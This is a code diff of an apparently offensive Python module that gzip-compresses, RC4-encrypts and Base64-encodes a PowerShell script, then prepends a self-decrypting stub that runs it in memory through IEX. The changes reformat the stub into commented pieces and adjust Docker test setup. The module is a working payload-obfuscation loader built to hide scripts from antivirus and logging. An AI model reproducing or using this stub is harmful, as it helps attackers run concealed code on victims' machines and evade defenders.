@@ -6,15 +6,12 @@ import os, gzip, base64, string
 from Crypto.Cipher import ARC4
 from Crypto.Hash import SHA256
 
-class Rc4(DockerExtension, Module):
-    """
-    Compress, Encrypt and Base64 encode a powershell script and prepend a decode/decrypt/decompress stub.
-    """
 
-    # A list of docker images required by the module.
-    images = [
-        "mcr.microsoft.com/powershell:latest"
-    ]
+class RC4(DockerExtension, Module):
+    """
+    Compress, RC4 encrypt and Base64 encode a powershell script and
+    prepend a decode/decrypt/decompress stub.
+    """
 
     def usage(self) -> object:
         """
@@ -37,13 +34,11 @@ class Rc4(DockerExtension, Module):
 
         Module.do updates self.options with options.
 
-        DockerExtension.do prepares required docker images.
-
         :param data: Data to be used by module, in bytes
         :param options: Dict of options to be used by module
         :return: Generator containing results of module execution, in bytes
         """
-        super().do(data, options, prep=False)
+        super().do(data, options)
 
         # Validate input
         try:
@@ -72,12 +67,40 @@ class Rc4(DockerExtension, Module):
         self.options["encoded_key"] = encoded_key.decode()
         
         # Place encoded command in harness
-        self.options["encrypted"] = "$(& $({$D,$K=$Args;$S=0..255;0..255|%%{$J=($J+$S[$_]+$K[$_%%$K.Length])%%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%%{$I=($I+1)%%256;$H=($H+$S[$I])%%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%%256]}}) $([System.Convert]::FromBase64String('%(encoded)s')) $([System.Convert]::FromBase64String('%(encoded_key)s')))" % self.options
-        cmd = "IEX (New-Object System.IO.StreamReader($(New-Object System.IO.Compression.GzipStream($(New-Object System.IO.MemoryStream(,%(encrypted)s)),[System.IO.Compression.CompressionMode]::Decompress)),[System.Text.Encoding]::UTF8)).ReadToEnd()" % self.options
+        cmd = ("IEX "+
+
+            # Read bytes from stream
+            "(New-Object System.IO.StreamReader("+
+
+            # Decompress stream
+            "$(New-Object System.IO.Compression.GzipStream("+
+
+            # Place bytes in stream
+            "$(New-Object System.IO.MemoryStream("+
+
+            # Decrypt bytes
+            # ---------------
+            ",$("+
+            # RC4
+            "& $({$D,$K=$Args;$S=0..255;0..255|%%{$J=($J+$S[$_]+$K[$_%%$K.Length])%%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%%{$I=($I+1)%%256;$H=($H+$S[$I])%%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%%256]}})"+
+            # Param 0: Encrypted Data
+            " $([System.Convert]::FromBase64String('%(encoded)s'))"+
+            # Param 1: Key
+            " $([System.Convert]::FromBase64String('%(encoded_key)s'))"+
+            ")"
+            # ---------------
+
+            ")"+
+            "),[System.IO.Compression.CompressionMode]::Decompress)"+
+            "),[System.Text.Encoding]::UTF8)"+
+            ").ReadToEnd()" % self.options
+
+            ) % self.options
 
         # Convert harness to bytes and return
         yield cmd.encode()
 
+    @DockerExtension.ImageDecorator(["mcr.microsoft.com/powershell:latest"])
     def test(self):
         """
         Perform unit tests to verify this module's functionality.
@@ -87,9 +110,6 @@ class Rc4(DockerExtension, Module):
             b"IqSAUVlMGUne7XBAhQwfD4dkU39Rkb5Wcy0WpUwdgVM=" in 
             b"".join(self.do(bytes(range(0, 256)), {"key": "A"*32})),
             "Key encoding produced innacurate results")
-
-        # Test content encryption (gzip header not consistent)
-        # (skip, unreliable output)
 
         # Test execution
         test = string.ascii_letters + string.digits
